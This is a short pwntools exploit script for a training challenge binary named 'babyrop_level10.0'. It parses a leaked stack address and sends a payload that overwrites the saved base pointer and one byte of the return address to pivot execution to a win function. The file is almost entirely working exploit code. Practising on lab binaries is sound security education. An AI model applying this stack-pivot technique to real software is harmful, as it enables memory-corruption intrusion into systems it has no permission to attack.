from pwn import *
import sys

context.log_level = 'debug'
context.binary = exe = ELF('/challenge/babyrop_level10.0', checksec=False)
libc = exe.libc


if len(sys.argv) == 2:   
    r = process(exe.path)
    gdb.attach(r, gdbscript="""
               b *main
               b *challenge+568
               b *challenge+726
               """)
else:
    r = process(exe.path)

def info(x):
    return log.info(x)

r.recvuntil(b'[LEAK] Your input buffer is located at: ')
leak_input = int(r.recvn(14), 16)
address_win = leak_input - 8
overwriterbp = address_win - 8
info("The address of input start at: " + hex(leak_input))
info("The address on the stack store win function: " + hex(address_win))
#offset: 64 to retaddr
payload = b'a'*56
payload += p64(overwriterbp)
payload += 0x2f.to_bytes(1, 'big')
r.send(payload)
r.interactive()